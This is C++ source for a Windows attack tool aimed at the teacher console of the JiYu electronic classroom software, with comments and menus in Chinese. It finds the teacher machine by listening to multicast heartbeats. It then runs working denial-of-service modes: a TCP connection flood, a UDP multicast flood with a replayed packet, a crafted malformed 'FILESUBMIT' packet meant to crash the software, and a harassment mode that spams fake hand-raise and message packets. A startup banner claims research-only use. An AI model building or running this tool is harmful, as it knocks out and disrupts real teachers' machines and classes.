#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

#include <iostream>
#include <cstring>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <atomic>
#include <random>
#include <winsock2.h>
#include <ws2tcpip.h>

#define TEACHER_MULTICAST_GROUP "224.50.50.42"
#define TEACHER_PORT            4988
#define TEACHER_CONTROL_PORT    4806
#define BUFFER_SIZE             4096

class JiYuAttacker {
private:
    std::string targetIP;
    std::atomic<bool> attacking{ false };
    std::vector<std::thread> attackThreads;
    std::atomic<uint64_t> packetsSent{ 0 };
    std::atomic<uint64_t> bytesSent{ 0 };
    std::atomic<uint64_t> connectFailures{ 0 };
    std::atomic<uint64_t> sendFailures{ 0 };

    // 生成随机字符串
    std::string generateRandomString(int length) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::string result;
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

        for (int i = 0; i < length; ++i) {
            result += alphanum[dis(gen)];
        }
        return result;
    }

    // TCP SYN Flood攻击线程
    void tcpSynFloodThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) continue;

            u_long mode = 1;
            ioctlsocket(sock, FIONBIO, &mode);

            int reuse = 1;
            setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

            sockaddr_in targetAddr;
            targetAddr.sin_family = AF_INET;
            targetAddr.sin_port = htons(TEACHER_CONTROL_PORT);
            targetAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

            connect(sock, (sockaddr*)&targetAddr, sizeof(targetAddr));

            localPackets++;
            if (localPackets % 100 == 0) {
                packetsSent += 100;
            }

            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::microseconds(10));
        }

        packetsSent += localPackets;
        WSACleanup();
    }

    // UDP组播洪水攻击线程
    void udpMulticastFloodThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        SOCKET floodSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (floodSock == INVALID_SOCKET) {
            WSACleanup();
            return;
        }

        int reuse = 1;
        setsockopt(floodSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        unsigned char fakePacket[44] = {
            0x4f, 0x4f, 0x4e, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x10, 0x00, 0x00, 0x00, 0x19, 0x6d, 0x6a, 0xf9,
            0x29, 0x5b, 0xb9, 0x46, 0xab, 0x95, 0x8a, 0x14,
            0x3e, 0xcd, 0xdc, 0x26, 0xc0, 0xa8, 0x79, 0x01,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x8c, 0x02, 0x00, 0x00
        };

        sockaddr_in multicastAddr;
        multicastAddr.sin_family = AF_INET;
        multicastAddr.sin_port = htons(TEACHER_PORT);
        multicastAddr.sin_addr.s_addr = inet_addr(TEACHER_MULTICAST_GROUP);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            int sent = sendto(floodSock, (char*)fakePacket, sizeof(fakePacket), 0,
                (sockaddr*)&multicastAddr, sizeof(multicastAddr));

            if (sent > 0) {
                localPackets++;
                bytesSent += sent;
            }

            if (localPackets % 1000 == 0) {
                packetsSent += 1000;
                std::this_thread::sleep_for(std::chrono::milliseconds(1));
            }
        }

        packetsSent += localPackets;
        closesocket(floodSock);
        WSACleanup();
    }

    // 协议级崩溃攻击线程
    void protocolCrashThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;
        uint64_t localBytes = 0;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) {
                connectFailures++;
                std::this_thread::sleep_for(std::chrono::milliseconds(50));
                continue;
            }

            DWORD timeout = 5000;
            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

            sockaddr_in teacherAddr;
            teacherAddr.sin_family = AF_INET;
            teacherAddr.sin_port = htons(TEACHER_CONTROL_PORT);
            teacherAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

            if (connect(sock, (sockaddr*)&teacherAddr, sizeof(teacherAddr)) == SOCKET_ERROR) {
                int error = WSAGetLastError();
                if (localPackets % 10 == 0) {
                    std::cout << "[DEBUG-Thread-" << threadId << "] 连接失败! Error: " << error << std::endl;
                }
                connectFailures++;
                closesocket(sock);
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }

            std::cout << "[DEBUG-Thread-" << threadId << "] ✓ 成功连接到教师机!" << std::endl;

            unsigned char worbPacket[12] = {
                0x00, 0x00, 0x01, 0x00,
                0x57, 0x4f, 0x52, 0x42,
                0x00, 0x00, 0x00, 0x00
            };

            int sent = send(sock, (char*)worbPacket, sizeof(worbPacket), 0);
            if (sent == SOCKET_ERROR) {
                std::cout << "[DEBUG-Thread-" << threadId << "] WORB包发送失败!" << std::endl;
                sendFailures++;
            }
            else {
                std::cout << "[DEBUG-Thread-" << threadId << "] ✓ 发送WORB包: " << sent << " 字节" << std::endl;
                localPackets++;
                localBytes += sent;
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(100));

            unsigned char crashPacket[576] = { 0 };
            crashPacket[0] = 0x00; crashPacket[1] = 0x00; crashPacket[2] = 0x01; crashPacket[3] = 0x00;
            crashPacket[4] = 0x49; crashPacket[5] = 0x46; crashPacket[6] = 0x50; crashPacket[7] = 0x55;
            crashPacket[8] = 0x34; crashPacket[9] = 0x02; crashPacket[10] = 0x00; crashPacket[11] = 0x00;
            crashPacket[12] = 0x02; crashPacket[13] = 0x00; crashPacket[14] = 0x00; crashPacket[15] = 0x00;
            crashPacket[16] = 0x00; crashPacket[17] = 0x00; crashPacket[18] = 0x00; crashPacket[19] = 0x00;
            crashPacket[20] = 0x00; crashPacket[21] = 0x00; crashPacket[22] = 0x00; crashPacket[23] = 0x00;
            crashPacket[24] = 0x20; crashPacket[25] = 0x00; crashPacket[26] = 0x00; crashPacket[27] = 0x00;
            crashPacket[28] = 0xe7; crashPacket[29] = 0x19; crashPacket[30] = 0xd3; crashPacket[31] = 0xaa;
            crashPacket[32] = 0x19; crashPacket[33] = 0x81; crashPacket[34] = 0xda; crashPacket[35] = 0x01;
            crashPacket[36] = 0x00; crashPacket[37] = 0x00; crashPacket[38] = 0x00; crashPacket[39] = 0x00;
            crashPacket[40] = 0x00; crashPacket[41] = 0x00; crashPacket[42] = 0x00; crashPacket[43] = 0x00;
            crashPacket[44] = 0x46; crashPacket[45] = 0x00; crashPacket[46] = 0x49; crashPacket[47] = 0x00;
            crashPacket[48] = 0x4c; crashPacket[49] = 0x00;
            crashPacket[50] = 0x45; crashPacket[51] = 0x00;
            crashPacket[52] = 0x53; crashPacket[53] = 0x00;
            crashPacket[54] = 0x55; crashPacket[55] = 0x00;
            crashPacket[56] = 0x42; crashPacket[57] = 0x00;
            crashPacket[58] = 0x4d; crashPacket[59] = 0x00;
            crashPacket[60] = 0x49; crashPacket[61] = 0x00;
            crashPacket[62] = 0x54; crashPacket[63] = 0x00;
            crashPacket[64] = 0x7c; crashPacket[65] = 0x00;
            crashPacket[66] = 0x64; crashPacket[67] = 0x00;
            crashPacket[68] = 0x64; crashPacket[69] = 0x00;
            crashPacket[70] = 0x64; crashPacket[71] = 0x00;
            crashPacket[72] = 0x64; crashPacket[73] = 0x00;
            crashPacket[74] = 0x64; crashPacket[75] = 0x00;
            crashPacket[76] = 0x64; crashPacket[77] = 0x00;
            crashPacket[78] = 0x64; crashPacket[79] = 0x00;
            crashPacket[80] = 0x64; crashPacket[81] = 0x00;
            crashPacket[82] = 0x64; crashPacket[83] = 0x00;
            crashPacket[84] = 0x64; crashPacket[85] = 0x00;
            crashPacket[86] = 0x64; crashPacket[87] = 0x00;
            crashPacket[88] = 0x64; crashPacket[89] = 0x00;
            crashPacket[90] = 0x64; crashPacket[91] = 0x00;
            crashPacket[92] = 0x64; crashPacket[93] = 0x00;
            crashPacket[94] = 0x64; crashPacket[95] = 0x00;
            crashPacket[96] = 0x7c; crashPacket[97] = 0x00;

            for (int i = 98; i < 576; i++) {
                crashPacket[i] = 0x66;
            }

            sent = send(sock, (char*)crashPacket, sizeof(crashPacket), 0);
            if (sent == SOCKET_ERROR) {
                int error = WSAGetLastError();
                std::cout << "[DEBUG-Thread-" << threadId << "] FILESUBMIT包发送失败! Error: " << error << std::endl;
                sendFailures++;
            }
            else {
                std::cout << "[DEBUG-Thread-" << threadId << "] ✓ 成功发送 " << sent << " 字节FILESUBMIT崩溃包！" << std::endl;
                localPackets++;
                localBytes += sent;

                std::this_thread::sleep_for(std::chrono::seconds(2));

                char responseBuffer[1024];
                int received = recv(sock, responseBuffer, sizeof(responseBuffer), 0);
                if (received > 0) {
                    std::cout << "[DEBUG-Thread-" << threadId << "] 收到教师机响应: " << received << " 字节" << std::endl;
                }
                else if (received == 0) {
                    std::cout << "[DEBUG-Thread-" << threadId << "] 教师机关闭连接" << std::endl;
                }
                else {
                    std::cout << "[DEBUG-Thread-" << threadId << "] 教师机无响应或连接已断开" << std::endl;
                }
            }

            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
        }

        packetsSent += localPackets;
        bytesSent += localBytes;
        WSACleanup();
    }

    // 不客气模式 - 持续发送举手包和随机消息包
    void impoliteModeThread(int threadId, int durationSeconds) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        SOCKET udpSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (udpSock == INVALID_SOCKET) {
            WSACleanup();
            return;
        }

        int reuse = 1;
        setsockopt(udpSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        sockaddr_in teacherAddr;
        teacherAddr.sin_family = AF_INET;
        teacherAddr.sin_port = htons(TEACHER_PORT);
        teacherAddr.sin_addr.s_addr = inet_addr(targetIP.c_str());

        // 举手包数据 (基于JuShou.csv)
        unsigned char raiseHandPacket[44] = {
            0x4f, 0x4f, 0x4e, 0x43, 0x00, 0x00, 0x01, 0x00,
            0x10, 0x00, 0x00, 0x00, 0x19, 0x6d, 0x6a, 0xf9,
            0x29, 0x5b, 0xb9, 0x46, 0xab, 0x95, 0x8a, 0x14,
            0x3e, 0xcd, 0xdc, 0x26, 0xc0, 0xa8, 0x79, 0x01,
            0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
            0x8c, 0x02, 0x00, 0x00
        };

        // 消息包基础结构 (基于SendText.csv)
        unsigned char baseMessagePacket[120] = {
            0x00, 0x00, 0x01, 0x00, 0x49, 0x46, 0x50, 0x55,
            0x34, 0x02, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x20, 0x00, 0x00, 0x00, 0xe7, 0x19, 0xd3, 0xaa,
            0x19, 0x81, 0xda, 0x01, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x54, 0x00, 0x45, 0x00,
            0x58, 0x00, 0x54, 0x00, 0x53, 0x00, 0x55, 0x00,
            0x42, 0x00, 0x4d, 0x00, 0x49, 0x00, 0x54, 0x00,
            0x7c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        };

        auto startTime = std::chrono::steady_clock::now();
        uint64_t localPackets = 0;
        uint64_t localBytes = 0;
        int packetCounter = 0;

        std::cout << "[不客气模式-Thread-" << threadId << "] 开始持续骚扰教师机..." << std::endl;

        while (attacking) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            if (elapsed >= durationSeconds) break;

            // 交替发送举手包和消息包
            if (packetCounter % 2 == 0) {
                // 发送举手包
                int sent = sendto(udpSock, (char*)raiseHandPacket, sizeof(raiseHandPacket), 0,
                    (sockaddr*)&teacherAddr, sizeof(teacherAddr));

                if (sent > 0) {
                    localPackets++;
                    localBytes += sent;
                    if (packetCounter % 10 == 0) {
                        std::cout << "[不客气模式-Thread-" << threadId << "] ✓ 发送举手包 #" << (packetCounter / 2 + 1) << std::endl;
                    }
                }
                else {
                    std::cout << "[不客气模式-Thread-" << threadId << "] ✗ 举手包发送失败" << std::endl;
                }
            }
            else {
                // 发送随机消息包
                std::string randomMessage = generateRandomString(20 + (packetCounter % 30));

                // 构建消息包
                std::vector<unsigned char> messagePacket(baseMessagePacket, baseMessagePacket + sizeof(baseMessagePacket));

                // 在适当位置插入随机消息
                if (messagePacket.size() > 80) {
                    for (size_t i = 0; i < randomMessage.length() && (i + 80) < messagePacket.size(); i++) {
                        messagePacket[i + 80] = randomMessage[i];
                    }
                }

                int sent = sendto(udpSock, (char*)messagePacket.data(), messagePacket.size(), 0,
                    (sockaddr*)&teacherAddr, sizeof(teacherAddr));

                if (sent > 0) {
                    localPackets++;
                    localBytes += sent;
                    if (packetCounter % 10 == 0) {
                        std::cout << "[不客气模式-Thread-" << threadId << "] ✓ 发送消息包: \"" << randomMessage << "\"" << std::endl;
                    }
                }
                else {
                    std::cout << "[不客气模式-Thread-" << threadId << "] ✗ 消息包发送失败" << std::endl;
                }
            }

            packetCounter++;

            // 随机延迟 100-500ms
            std::this_thread::sleep_for(std::chrono::milliseconds(100 + (packetCounter % 400)));
        }

        packetsSent += localPackets;
        bytesSent += localBytes;
        closesocket(udpSock);
        WSACleanup();

        std::cout << "[不客气模式-Thread-" << threadId << "] 完成，共发送 " << localPackets << " 个包" << std::endl;
    }

    // 混合攻击
    void mixedAttackThread(int durationSeconds) {
        std::thread t1(&JiYuAttacker::tcpSynFloodThread, this, 99, durationSeconds);
        std::thread t2(&JiYuAttacker::udpMulticastFloodThread, this, 98, durationSeconds);
        std::thread t3(&JiYuAttacker::protocolCrashThread, this, 97, durationSeconds);

        t1.detach();
        t2.detach();
        t3.detach();
    }

public:
    JiYuAttacker(const std::string& ip) : targetIP(ip) {}
    ~JiYuAttacker() { stopAttack(); }

    void startAttack(int attackType, int threads, int durationSeconds) {
        if (attacking) {
            std::cout << "[!] 攻击已在进行中！" << std::endl;
            return;
        }

        attacking = true;
        packetsSent = 0;
        bytesSent = 0;
        connectFailures = 0;
        sendFailures = 0;

        const char* attackName =
            (attackType == 1 ? "TCP SYN Flood" :
                attackType == 2 ? "UDP组播洪水" :
                attackType == 3 ? "FILESUBMIT协议崩溃攻击" :
                attackType == 4 ? "混合攻击" :
                attackType == 5 ? "不客气模式(持续骚扰)" : "未知攻击");

        const char* desc =
            (attackType == 3 ? "基于抓包Frame 17的576字节FILESUBMIT畸形包" :
                attackType == 2 ? "基于抓包OONC心跳包(224.50.50.42:4988)" :
                attackType == 5 ? "持续发送举手包和随机消息包骚扰教师机" : "");

        std::cout << "\n[+] 启动攻击: " << attackName << std::endl;
        if (strlen(desc) > 0) std::cout << "[*] " << desc << std::endl;
        std::cout << "目标IP: " << targetIP << std::endl;
        if (attackType != 4) {
            std::cout << "线程数: " << threads << std::endl;
        }
        std::cout << "持续时间: " << durationSeconds << "秒" << std::endl;
        std::cout << "\n[!] 攻击进行中..." << std::endl;

        if (attackType == 4) {
            mixedAttackThread(durationSeconds);
            std::this_thread::sleep_for(std::chrono::seconds(durationSeconds));
            attacking = false;
        }
        else if (attackType == 5) {
            // 不客气模式 - 持续骚扰
            for (int i = 0; i < threads; i++) {
                attackThreads.emplace_back(&JiYuAttacker::impoliteModeThread, this, i, durationSeconds);
            }
        }
        else {
            for (int i = 0; i < threads; i++) {
                if (attackType == 1) {
                    attackThreads.emplace_back(&JiYuAttacker::tcpSynFloodThread, this, i, durationSeconds);
                }
                else if (attackType == 2) {
                    attackThreads.emplace_back(&JiYuAttacker::udpMulticastFloodThread, this, i, durationSeconds);
                }
                else if (attackType == 3) {
                    attackThreads.emplace_back(&JiYuAttacker::protocolCrashThread, this, i, durationSeconds);
                }
            }
        }

        // 详细统计线程
        std::thread statsThread([this, durationSeconds, attackType]() {
            auto start = std::chrono::steady_clock::now();
            while (attacking) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - start).count();
                if (elapsed >= durationSeconds) break;

                if (attackType == 5) {
                    // 不客气模式专用统计
                    std::cout << "\r[不客气模式] 已发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 时间: " << elapsed << "/" << durationSeconds << "秒" << std::flush;
                }
                else {
                    // 其他模式统计
                    std::cout << "\r[+] 发送: " << packetsSent << " 包, "
                        << bytesSent << " 字节 | 失败: 连接" << connectFailures
                        << "/发送" << sendFailures << " | 时间: " << elapsed << "/" << durationSeconds << "秒" << std::flush;
                }
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
            });
        statsThread.detach();

        // 等待完成
        std::thread waitThread([this, durationSeconds]() {
            auto start = std::chrono::steady_clock::now();
            while (attacking) {
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - start).count();
                if (elapsed >= durationSeconds) {
                    attacking = false;
                    break;
                }
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
            });

        waitThread.join();
        stopAttack();
    }

    void stopAttack() {
        if (!attacking && attackThreads.empty()) return;

        std::cout << "\n[!] 正在停止攻击..." << std::endl;
        attacking = false;

        for (auto& t : attackThreads) {
            if (t.joinable()) t.join();
        }
        attackThreads.clear();

        std::cout << "[+] 攻击已停止" << std::endl;
        std::cout << "[*] 总计: " << packetsSent << " 包, " << bytesSent << " 字节" << std::endl;
        if (connectFailures > 0 || sendFailures > 0) {
            std::cout << "[*] 失败统计: 连接失败" << connectFailures
                << "次, 发送失败" << sendFailures << "次" << std::endl;
        }
    }

    void showMenu() {
        std::cout << "\n========== 极域电子教室测试工具 ==========" << std::endl;
        std::cout << "目标教师机: " << targetIP << std::endl;
        std::cout << "=========================================" << std::endl;
        std::cout << "[1] TCP SYN Flood (端口: " << TEACHER_CONTROL_PORT << ")" << std::endl;
        std::cout << "[2] UDP组播洪水 (组播: " << TEACHER_MULTICAST_GROUP << ":" << TEACHER_PORT << ")" << std::endl;
        std::cout << "[3] FILESUBMIT协议崩溃攻击" << std::endl;
        std::cout << "[4] 混合攻击 (全部同时)" << std::endl;
        std::cout << "[5] 不客气模式 (持续骚扰)" << std::endl;
        std::cout << "[6] 重新发现教师机" << std::endl;
        std::cout << "[0] 退出程序" << std::endl;
        std::cout << "=========================================" << std::endl;
        std::cout << "请选择: ";
    }
};

class JiYuStudentClient {
private:
    SOCKET multicastSock;
    std::string teacherIP;

    void listLocalIPs() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        hostent* host = gethostbyname(hostname);

        std::cout << "[*] 本机网卡IP地址列表：" << std::endl;
        for (int i = 0; host->h_addr_list[i] != nullptr; i++) {
            in_addr addr;
            memcpy(&addr, host->h_addr_list[i], sizeof(in_addr));
            std::cout << "  - " << inet_ntoa(addr) << std::endl;
        }
    }

    std::string parseCANCFromPacket(const char* buffer, int length) {
        if (length < 112) return "";

        if (length >= 0x24) {
            unsigned char ipBytes[4];
            ipBytes[0] = buffer[0x20];
            ipBytes[1] = buffer[0x21];
            ipBytes[2] = buffer[0x22];
            ipBytes[3] = buffer[0x23];

            char ipStr[16];
            sprintf(ipStr, "%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3]);
            return std::string(ipStr);
        }
        return "";
    }

public:
    JiYuStudentClient() {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        multicastSock = INVALID_SOCKET;
    }

    ~JiYuStudentClient() {
        if (multicastSock != INVALID_SOCKET) closesocket(multicastSock);
        WSACleanup();
    }

    std::string discoverTeacherIP(int timeoutSeconds = 10) {
        std::cout << "=== 极域电子教室教师机发现工具 ===\nBy: Lxrui & KimiAI\n" << std::endl;
        listLocalIPs();

        std::cout << "\n[*] 正在监听组播地址 " << TEACHER_MULTICAST_GROUP
            << " 端口 " << TEACHER_PORT << " ..." << std::endl;
        std::cout << "[*] 超时时间: " << timeoutSeconds << " 秒" << std::endl;

        multicastSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (multicastSock == INVALID_SOCKET) {
            std::cerr << "[-] 创建套接字失败，错误码：" << WSAGetLastError() << std::endl;
            return "";
        }

        int reuse = 1;
        if (setsockopt(multicastSock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
            std::cerr << "[!] 设置SO_REUSEADDR失败，错误码：" << WSAGetLastError() << std::endl;
        }

        sockaddr_in localAddr;
        memset(&localAddr, 0, sizeof(localAddr));
        localAddr.sin_family = AF_INET;
        localAddr.sin_addr.s_addr = INADDR_ANY;
        localAddr.sin_port = htons(TEACHER_PORT);

        if (bind(multicastSock, (sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
            std::cerr << "[-] 绑定端口失败，错误码：" << WSAGetLastError() << std::endl;
            closesocket(multicastSock);
            return "";
        }

        ip_mreq mreq;
        mreq.imr_multiaddr.s_addr = inet_addr(TEACHER_MULTICAST_GROUP);
        mreq.imr_interface.s_addr = INADDR_ANY;

        if (setsockopt(multicastSock, IPPROTO_IP, IP_ADD_MEMBERSHIP,
            (char*)&mreq, sizeof(mreq)) == SOCKET_ERROR) {
            std::cerr << "[!] 加入组播组失败（可能需要管理员权限），错误码："
                << WSAGetLastError() << std::endl;
        }

        DWORD timeout = timeoutSeconds * 1000;
        setsockopt(multicastSock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));

        char buffer[BUFFER_SIZE];
        int packetCount = 0;

        std::cout << "[*] 等待教师机广播消息..." << std::endl;

        auto startTime = std::chrono::steady_clock::now();

        while (true) {
            sockaddr_in fromAddr;
            int fromLen = sizeof(fromAddr);
            int recvLen = recvfrom(multicastSock, buffer, BUFFER_SIZE - 1, 0,
                (sockaddr*)&fromAddr, &fromLen);

            auto currentTime = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(currentTime - startTime).count();
            if (elapsed >= timeoutSeconds) {
                std::cerr << "\n[-] 搜索超时，未在 " << timeoutSeconds << " 秒内发现教师机" << std::endl;
                break;
            }

            if (recvLen > 0) {
                packetCount++;
                std::cout << "\r[*] 收到数据包 " << packetCount << " (长度: " << recvLen << " 字节)" << std::flush;

                if (recvLen >= 4) {
                    std::string packetType(buffer, 4);

                    if (packetType == "OONC" && recvLen >= 44) {
                        teacherIP = inet_ntoa(fromAddr.sin_addr);

                        std::cout << "\n\n[+] 发现教师机 (OONC包)!" << std::endl;
                        std::cout << "====================================" << std::endl;
                        std::cout << "教师机IP地址: " << teacherIP << std::endl;
                        std::cout << "通信端口: " << ntohs(fromAddr.sin_port) << std::endl;
                        std::cout << "数据包大小: " << recvLen << " 字节" << std::endl;
                        std::cout << "包类型: OONC" << std::endl;
                        std::cout << "====================================" << std::endl;

                        closesocket(multicastSock);
                        return teacherIP;
                    }
                    else if (packetType == "CANC" && recvLen >= 112) {
                        teacherIP = parseCANCFromPacket(buffer, recvLen);
                        if (!teacherIP.empty()) {
                            std::cout << "\n\n[+] 发现教师机 (CANC包)!" << std::endl;
                            std::cout << "====================================" << std::endl;
                            std::cout << "教师机IP地址: " << teacherIP << std::endl;
                            std::cout << "通信端口: " << ntohs(fromAddr.sin_port) << std::endl;
                            std::cout << "数据包大小: " << recvLen << " 字节" << std::endl;
                            std::cout << "包类型: CANC" << std::endl;
                            std::cout << "====================================" << std::endl;

                            closesocket(multicastSock);
                            return teacherIP;
                        }
                    }
                    else {
                        std::cout << "\r[*] 未知包类型: " << packetType << " (长度: " << recvLen << ")" << std::flush;
                    }
                }
            }
            else if (recvLen == 0) {
                break;
            }
        }

        closesocket(multicastSock);
        std::cerr << "\n[-] 搜索失败，未发现教师机" << std::endl;
        return "";
    }
};

void showWarning() {
    std::cout << "=====================================================================" << std::endl;
    std::cout << "警告：本程序仅供网络安全研究和教育用途！" << std::endl;
    std::cout << "请务必在授权环境下测试，非法使用可能违反法律！" << std::endl;
    std::cout << "=====================================================================" << std::endl;
    std::cout << "\n按回车键继续..." << std::endl;
    std::cin.get();
}

int main() {
    showWarning();

    BOOL isAdmin = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    if (!isAdmin) {
        std::cout << "\n[!] 警告：未以管理员权限运行，某些功能可能受限！" << std::endl;
        std::cout << "[!] 建议右键以管理员身份运行此程序" << std::endl;
        std::cout << "\n按回车键继续..." << std::endl;
        std::cin.get();
    }

    std::string teacherIP;
    JiYuStudentClient* client = nullptr;
    JiYuAttacker* attacker = nullptr;

    while (true) {
        if (client == nullptr) {
            client = new JiYuStudentClient();
            teacherIP = client->discoverTeacherIP(10);
            delete client;
            client = nullptr;
        }

        if (!teacherIP.empty() && attacker == nullptr) {
            attacker = new JiYuAttacker(teacherIP);
        }

        if (attacker != nullptr) {
            attacker->showMenu();

            int choice;
            std::cin >> choice;
            std::cin.ignore();

            switch (choice) {
            case 1:
            case 2:
            case 3:
            case 5: {
                std::cout << "\n[*] 攻击配置:" << std::endl;
                std::cout << "线程数(建议10-100): ";
                int threads;
                std::cin >> threads;
                std::cout << "持续时间(秒): ";
                int duration;
                std::cin >> duration;
                std::cin.ignore();

                attacker->startAttack(choice, threads, duration);
                break;
            }
            case 4: {
                std::cout << "\n[*] 混合攻击配置:" << std::endl;
                std::cout << "持续时间(秒): ";
                int duration;
                std::cin >> duration;
                std::cin.ignore();

                std::cout << "[+] 启动混合攻击模式..." << std::endl;
                attacker->startAttack(4, 0, duration);
                break;
            }
            case 6: {
                delete attacker;
                attacker = nullptr;
                std::cout << "\n[*] 重新发现教师机..." << std::endl;
                break;
            }
            case 0: {
                delete attacker;
                std::cout << "\n[*] 程序已退出" << std::endl;
                return 0;
            }
            default: {
                std::cout << "\n[-] 无效选项！" << std::endl;
                break;
            }
            }
        }
        else {
            std::cout << "\n[-] 未发现教师机，重试？(y/n): ";
            char retry;
            std::cin >> retry;
            std::cin.ignore();
            if (retry != 'y' && retry != 'Y') {
                break;
            }
        }
    }

    if (attacker) delete attacker;
    std::cout << "\n[*] 程序已退出" << std::endl;
    return 0;
}